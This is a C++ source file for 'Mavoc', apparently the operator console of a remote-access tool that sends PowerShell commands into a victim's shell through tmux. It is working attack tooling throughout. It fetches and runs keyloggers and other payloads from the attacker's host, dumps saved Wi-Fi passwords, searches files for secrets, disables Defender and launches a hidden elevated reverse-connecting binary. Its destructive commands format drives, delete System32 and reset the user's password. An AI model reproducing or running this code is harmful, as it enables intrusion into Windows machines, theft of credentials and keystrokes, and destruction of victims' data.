/*
Mavoc Powershell bible.
https://github.com/Whitecat18/Mavoc
*/

#include <iostream>
#include <string>
#include <fstream>
#include <cstdlib>
#include <regex>

#define RESET "\033[0m"
#define RED "\033[31m"
#define GREEN "\033[32m"
#define YELLOW "\033[33m"
#define BLUE "\033[34m"
#define MAGENTA "\033[35m"
#define CYAN "\033[36m"

using namespace std;

void replaceStringInContent(string& content, const string& targetWord, const string& replacementWord) {
    size_t pos = content.find(targetWord);
    while (pos != string::npos) {
        content.replace(pos, targetWord.length(), replacementWord);
        pos = content.find(targetWord, pos + replacementWord.length());
    }
}

void paurse(string& psw_command ,string& local_ip_address){

    
    // IP Parsing For port
    //string local_ip_address = local_ip_address;
    string local_ip_port = "80";
    //string ip_addr_port = local_ip_address + ":" + local_ip_port;
    string ip_addr_port = local_ip_address;
    //string content = "This is my ip address you make changes to 0.0.0.0:1234 and thats it"; // Replace this with the input string
    //string content = "This is a test weather it cant change";
    //string psw_exec_it = psw_command;
    string content = psw_command;
    string targetWord = "0.0.0.0";
    string replacementWord = ip_addr_port;

    replaceStringInContent(content, targetWord, replacementWord);
    
    
    // Execution Set
    string powershell_command = content;
    string pause = "tmux send-keys -t mavoc-shell ' " + powershell_command + " '  C-m ";
    system(pause.c_str());
}

void ip_parsing(){
    
}
int main() {
    string psw_cmd;
    string psw_command;
    string pause;
    string banner;
    string local_ip_address;
    string local_ip_port;
    int y_n;
    
    banner = R"(
┳┳┓           ┏┓  ┳┓•┓ ┓┏┓
┃┃┃┏┓┓┏┏┓┏  ┏┓┗┓━━┣┫┓┣┓┃┣ 
┛ ┗┗┻┗┛┗┛┗  ┣┛┗┛  ┻┛┗┗┛┗┗┛
            ┛             
    )";

    cout << banner;

    // Read Ip Address from ip_addr;

    ifstream infile("ip_addr");

    if(!infile.is_open()) {
        cerr << "Fail to Fetch the IP Address . Enter manually :";
        cin >> local_ip_address;
    }

    string stored_ip_address;
    getline(infile, stored_ip_address);

    infile.close();
    
    local_ip_address = stored_ip_address;

    //cout << "Enter Local IP for Payload : ";
    //cin >> local_ip_address;
    
    
    // Terminal Starts
        while (true) {
        cout << "Mavoc ps > ";
        getline(cin, psw_cmd);
        psw_cmd = regex_replace(psw_cmd, regex("\\s+$"), "");

        // Construct the complete command string
        //psw_command = "";  
        pause = "tmux send-keys -t mavoc-shell '" + psw_command + "' C-m ";
        
        if (psw_cmd.empty()) {
            continue;
        }

        else if (psw_cmd == "help"){
            system("cat files/infos/help_powershell");
        }

        else if (psw_cmd == "cls"){
            psw_command = "cls";
            paurse(psw_command , local_ip_address);
        }
        else if(psw_cmd == "save ip"){
            cout << "saves Ip and port for offline Attacks " << endl;
            cout << "Local Ip Address :";
            cin >> local_ip_address;
            cout << "Local Port [Default Type 80] : ";
            cin >> local_ip_port;
            cout << "\033[1;32mSuccess[0m" << endl;
        }
        else if (psw_cmd == "username"){
            psw_command = "$env:USERNAME";
            paurse(psw_command, local_ip_address);
        }

        else if (psw_cmd == "- volume") {
            
            psw_command = "$obj = New-Object -com wscript.shell;for ([int]$i = 0; $i -lt 100; $i += 2) {$obj.SendKeys([char]174)}";
            //pause = "tmux send-keys -t stomp '" + psw_command + "' C-m ";
            paurse(psw_command, local_ip_address);
            //system(pause.c_str());
        }

        else if (psw_cmd == "+ volume") {
            
            psw_command = "$obj = New-Object -com wscript.shell;for ([int]$i = 0; $i -lt 100; $i += 2) {$obj.SendKeys([char]175)}";
            //pause = "tmux send-keys -t stomp '" + psw_command + "' C-m ";
            paurse(psw_command, local_ip_address);
            //system(pause.c_str());
        }

        else if (psw_cmd == "screen sleep"){
            psw_command = "$downloadUrl = \"http://0.0.0.0/screen_sleep.ps1\"; $tempFilePath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), \"screen_sleep.ps1\"); Invoke-WebRequest -Uri $downloadUrl -OutFile $tempFilePath; if (Test-Path $tempFilePath) { Set-ExecutionPolicy RemoteSigned -Scope Process; & $tempFilePath } else { Write-Host \"Failed to execute the script.\" }";
            paurse(psw_command, local_ip_address);
        }

        else if (psw_cmd == "send msg box"){
            string message,sender;
            cout << "Enter the Message to send : ";
            getline(cin, message);
            cout << "Enter the Box Title: ";
            getline(cin, sender);
            
            psw_command = "Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show(\"" + message + "\" , \"" + sender + "\", \"OK\", \"Information\")";
            paurse(psw_command, local_ip_address);
        }
        else if (psw_cmd == "ls"){
            psw_command = "pwd";
            paurse(psw_command, local_ip_address);
        }

        else if (psw_cmd == "shutdown"){
            psw_command = "shutdown -s -t 10";
            paurse(psw_command, local_ip_address);
       }
        else if (psw_cmd == "kill explorer"){
            psw_command = "Get-Process explorer | Stop-Process -Force";
            paurse(psw_command, local_ip_address);
        }
        
        else if (psw_cmd == "get adapter info"){
            psw_command = "Get-NetAdapter | Select-Object Name, InterfaceDescription, Status, MacAddress, LinkSpeed, MediaType, DriverVersion, DriverDate, PhysicalMediaType, Virtual | Format-Table";
            paurse(psw_command, local_ip_address);
        }
        else if (psw_cmd == "list running services"){
            psw_command = "Get-Service | Where-Object {$_.Status -eq \"Running\"}";
            paurse(psw_command, local_ip_address);
        }
        
        else if (psw_cmd == "list cpu process"){
            psw_command = "Get-Process | Sort-Object -Descending CPU";
            paurse(psw_command, local_ip_address);
        }
        else if (psw_cmd == "search sensitive files"){
            psw_command = "Get-ChildItem -Path C:\\ -Recurst routinge -Include *.conf, *.ini, *.xml, *.cfg | Select-String -Pattern \"password|secret|api_key\"";
            paurse(psw_command, local_ip_address);
        }
        else if (psw_cmd == "get routing table"){
            psw_command = "Get-NetRoute | Select-Object DestinationPrefix, PrefixLength, NextHop, RouteMetric, InterfaceIndex | Format-Table";
            paurse(psw_command, local_ip_address);
        }
        else if (psw_cmd == "check if admin"){
            //psw_command = "$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator); echo '------'; $isAdmin ; echo '------' ";
            psw_command = "function Check-IsElevated { $id = [System.Security.Principal.WindowsIdentity]::GetCurrent(); $p = New-Object System.Security.Principal.WindowsPrincipal($id); if ($p.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)) { Write-Output $true } else { Write-Output $false } }; if (-not(Check-IsElevated)) { Write-Host \"Shell : Not Administrator\" } else { write-host \"Shell : Administrator\" }";
            paurse(psw_command, local_ip_address);
        }
        
        else if (psw_cmd == "get wifi creds"){
            psw_command = "(netsh wlan show profiles) | Select-String \"\\:(.+)$\" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=\"$name\" key=clear)} | Select-String \"Key Content\\W+\\:(.+)$\" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String -OutVariable dataCaptured";
            paurse(psw_command, local_ip_address);
        }

        else if (psw_cmd == "disable recommentation"){
            psw_command = "if ($PredictiveInputOptions = Get-Variable -Name PredictiveInputOptions -Scope Global -ErrorAction SilentlyContinue) { $PredictiveInputOptions.Value.Enabled = $false } else { $PredictiveInputOptions = New-Object -TypeName PSVariable -ArgumentList 'PredictiveInputOptions', (New-Object PSObject -Property @{ Enabled = $false }), 'Global'; Set-Variable -Scope Global -Name PredictiveInputOptions -Value $PredictiveInputOptions }";
            paurse(psw_command, local_ip_address);
        }

        else if (psw_cmd == "list exe apps"){
            psw_command = "Get-ChildItem HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall, HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall | Get-ItemProperty | Where-Object { $_.DisplayName -ne $null } | Select-Object DisplayName, UninstallString";
            paurse(psw_command, local_ip_address);
        }

        else if (psw_cmd == "open custom links"){
            string custom123;
            char yy_n;
            cout << "Enter the Custom Links to open: ";
            cin >> custom123;
            cout << "Run on Default Browser [ y/n ]: ";
            cin >> yy_n;

            if (yy_n == 'y'){
                psw_command = "Start-Process " + custom123 + " ";
                paurse(psw_command, local_ip_address);
            }
            else {
            cout << endl << "Select Browser to Open With : " << endl << endl;
            cout << "1. Chrome \n 2.FireFox \n 3.Microsoft Edge" << endl;
            cout << "Select One :";
            cin >> y_n;

            if (y_n == 1){
                psw_command = "Start-Process \"chrome.exe\" -ArgumentList \"--start-maximized\", \"" + custom123 + "\" ";
                paurse(psw_command, local_ip_address);

            }
            else if (y_n == 2){
                psw_command = "Start-Process \"firefox.exe\" -ArgumentList \"--new-window\", \""+ custom123 +"\"";
                paurse(psw_command, local_ip_address);
            
            }
            else if(y_n == 3){
                psw_command = "Start-Process \"msedge.exe\" -ArgumentList \"--start-maximized\", \"" + custom123 + "\" ";
                paurse(psw_command, local_ip_address);
            }
            else{
                psw_command = "Start-Process " + custom123 + " ";
                paurse(psw_command, local_ip_address); 
            }
        }                   
    }

        else if (psw_cmd == "list partition"){
                psw_command = "Get-PSDrive -PSProvider FileSystem | format-table -property Name,Root,@{n=\"Used (GB)\";e={[math]::Round($_.Used/1GB,1)}},@{n=\"Free (GB)\";e={[math]::Round($_.Free/1GB,1)}}";
                paurse(psw_command, local_ip_address);       
        }

        else if (psw_cmd == "list service"){
            psw_command = "Get-Service | Where-Object {$_.StartType -eq \"Automatic\" -and $_.Status -ne \"Running\"} | Select-Object -Property Name, DisplayName";
            paurse(psw_command, local_ip_address);    
        }
        else if (psw_cmd == "restart"){
            psw_command = "Restart-Computer";
            paurse(psw_command, local_ip_address);
        }

        else if (psw_cmd == "enum all"){
            psw_command = "$downloadUrl = \"http://0.0.0.0/all_in_one_enum.ps1\"; $tempFilePath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), \"all_in_one_enum.ps1\"); Invoke-WebRequest -Uri $downloadUrl -OutFile $tempFilePath; if (Test-Path $tempFilePath) { Set-ExecutionPolicy RemoteSigned -Scope Process; & $tempFilePath } else { Write-Host \"Failed to execute the script.\" }";
            paurse(psw_command, local_ip_address);
        }

        else if (psw_cmd == "systeminfo"){
            psw_command = "systeminfo";
            paurse(psw_command, local_ip_address);
        }

        else if (psw_cmd == "low keylog"){
            psw_command = "$downloadUrl = \"http://0.0.0.0/keylog.exe\"; $tempFilePath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), \"keylog.exe\"); Invoke-WebRequest -Uri $downloadUrl -OutFile $tempFilePath; if (Test-Path $tempFilePath) { Set-ExecutionPolicy RemoteSigned -Scope Process; & $tempFilePath } else { Write-Host \"Failed to execute the script.\" }";
            paurse(psw_command, local_ip_address);
            cout << GREEN << "KeyStokes stored at temp dir with" << CYAN << " keylog.txt " << RESET << "file" << endl;
        }
        
        // System Malfunc Commands

        else if (psw_cmd == "disable defender"){
            psw_command = "Set-MpPreference -DisableRealtimeMonitoring $true";
            paurse(psw_command, local_ip_address);
        }

        else if (psw_cmd == "load ram"){
            psw_command = "Invoke-WebRequest -Uri \"http://0.0.0.0/load_ram.ps1\" -OutFile ([System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), \"load_ram.ps1\")); Set-ExecutionPolicy RemoteSigned -Scope Process; & ([System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), \"load_ram.ps1\"))";
            paurse(psw_command, local_ip_address);
        }
        else if (psw_cmd == "load cpu"){
            psw_command = "$downloadUrl = \"http://0.0.0.0/load_cpu.ps1\"; $tempFilePath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), \"load_cpu.ps1\"); Invoke-WebRequest -Uri $downloadUrl -OutFile $tempFilePath; if (Test-Path $tempFilePath) { Set-ExecutionPolicy RemoteSigned -Scope Process; & $tempFilePath } else { Write-Host \"Failed to execute the script.\" }";
            paurse(psw_command, local_ip_address);
        }
        else if (psw_cmd == "clear temp files"){
            psw_command = "Invoke-WebRequest -Uri \"http://0.0.0.0/del_temp.ps1\" -OutFile ([System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), \"del_temp.ps1\")); Set-ExecutionPolicy RemoteSigned -Scope Process; & ([System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), \"del_temp.ps1\"))";
            paurse(psw_command, local_ip_address);
        }

        else if (psw_cmd == "system info"){
            psw_command = "write-host \"------\";$downloadUrl = \"http://0.0.0.0/system_info.ps1\"; $tempFilePath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), \"system_info.ps1\"); Invoke-WebRequest -Uri $downloadUrl -OutFile $tempFilePath; if (Test-Path $tempFilePath) { Set-ExecutionPolicy RemoteSigned -Scope Process; & $tempFilePath } else { Write-Host \"Failed to execute the script.\" } ; echo ------ ; ";
            paurse(psw_command, local_ip_address);
        }

        else if (psw_cmd == "disable key-mouse"){
            psw_command = "$downloadUrl = \"http://0.0.0.0/disable_key_mouse.ps1\"; $tempFilePath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), \"disable_key_mouse.ps1\"); Invoke-WebRequest -Uri $downloadUrl -OutFile $tempFilePath; if (Test-Path $tempFilePath) { Set-ExecutionPolicy RemoteSigned -Scope Process; & $tempFilePath } else { Write-Host \"Failed to execute the script.\" }";
            paurse(psw_command, local_ip_address);
        }
        
        else if (psw_cmd == "enable key-mouse"){
            psw_command = "$downloadUrl = \"http://0.0.0.0/enable_key_mouse.ps1\"; $tempFilePath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), \"enable_key_mouse.ps1\"); Invoke-WebRequest -Uri $downloadUrl -OutFile $tempFilePath; if (Test-Path $tempFilePath) { Set-ExecutionPolicy RemoteSigned -Scope Process; & $tempFilePath } else { Write-Host \"Failed to execute the script.\" }";    
            paurse(psw_command, local_ip_address);
        }

        else if (psw_cmd == "remove win-key"){
            psw_command = "$downloadUrl = \"http://0.0.0.0/win-key-killer.ps1\"; $tempFilePath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), \"win-key-killer.ps1\"); Invoke-WebRequest -Uri $downloadUrl -OutFile $tempFilePath; if (Test-Path $tempFilePath) { Set-ExecutionPolicy RemoteSigned -Scope Process; & $tempFilePath } else { Write-Host \"Failed to execute the script.\" }";
            paurse(psw_command, local_ip_address);
        }

        else if (psw_cmd == "list unaps"){
            psw_command = "$downloadUrl = \"http://0.0.0.0/list_process.ps1\"; $tempFilePath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), \"list_process.ps1\"); Invoke-WebRequest -Uri $downloadUrl -OutFile $tempFilePath; if (Test-Path $tempFilePath) { Set-ExecutionPolicy RemoteSigned -Scope Process; & $tempFilePath } else { Write-Host \"Failed to execute the script.\" }";
            paurse(psw_command, local_ip_address);
        }

        else if (psw_cmd == "get admin shell"){
            string ab;
            string ac = "1234";
            
            ab = local_ip_address;
            psw_command = "Start-Process powershell.exe -ArgumentList ' -NoProfile -ExecutionPolicy Bypass -Command \"Invoke-WebRequest -Uri \\\"https://github.com/Whitecat18/Mavoc/releases/download/v1.0.0/win_payguy.exe\\\" -OutFile \\\"$env:TEMP/win_payguy.exe\\\" ; cd $env:TEMP ; .\\win_payguy.exe -d "+ ab + ":" +  ac +" \" ' -Verb RunAs -WindowStyle Hidden";
            cout << "--------------------------" << endl;
            cout << psw_command << endl;
            cout << "--------------------------" << endl;
            cout << "Copy and paste the Above command to the mavoc-shell" << endl;

            //paurse(psw_command, local_ip_address);
        }

        else if (psw_cmd == "change user password"){
            string pswd;
            cout << "Enter the Password to Change: ";
            cin >> pswd; 
            psw_command = "$name = $env:USERNAME ; net user $name "+ pswd + " ";
            paurse(psw_command, local_ip_address);
        }

        else if (psw_cmd == "erase disk"){
            string drive_letter;
            char ye_no;
            cout << RED << "Warning . This May Erase your Disk Fully . Continue [y/n] : " << RESET;
            cin >> ye_no;
            if (ye_no == 'y'){
                cout << "Enter the Drive Letter (IN CAPS) : ";
                cin >> drive_letter;
                psw_command = "Format-Volume -DriveLetter "+ drive_letter +" -FileSystem NTFS -Confirm:$false";
                paurse(psw_command, local_ip_address);
            }
            else {
                continue;
            }
        }

        else if (psw_cmd == "del sys32"){
            psw_command = "cd C:\\\\Windows ; takeown /F System32 /R ; del \\System32";
            paurse(psw_command, local_ip_address);
        }

        else if(psw_cmd == "psw keylog"){
           psw_command = "$downloadUrl = \"http://0.0.0.0/script1.ps1\"; $tempFilePath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), \"script1.ps1\"); Invoke-WebRequest -Uri $downloadUrl -OutFile $tempFilePath; if (Test-Path $tempFilePath) { Set-ExecutionPolicy RemoteSigned -Scope Process; & $tempFilePath } else { Write-Host \"Failed to execute the script.\" }";
           paurse(psw_command, local_ip_address);
        }

        else if(psw_cmd == "check reg keys"){
            psw_command = "reg query \"HKCU\\Control Panel\\Desktop\" /s";
            paurse(psw_command, local_ip_address);
        }

        //else if (psw_command == "test")

        else if (psw_cmd == "clear"){
            system("clear");
        }

        else if(psw_cmd == "exit"){
            break;
        }

        else {
            cout << "\033[0;33Not Found . Use help command for more info.\033[0m" << endl;
        }


        // Example to Add your own Ps commands ..


        /*else if (psw_cmd == " YOUR-COMMAND HERE") {
            psw_command = "YOUR PS STRING OR .dll PS1 DLL INSTRUCTIONS";
             paurse(psw_command, local_ip_address);
        }
        */


    }
}



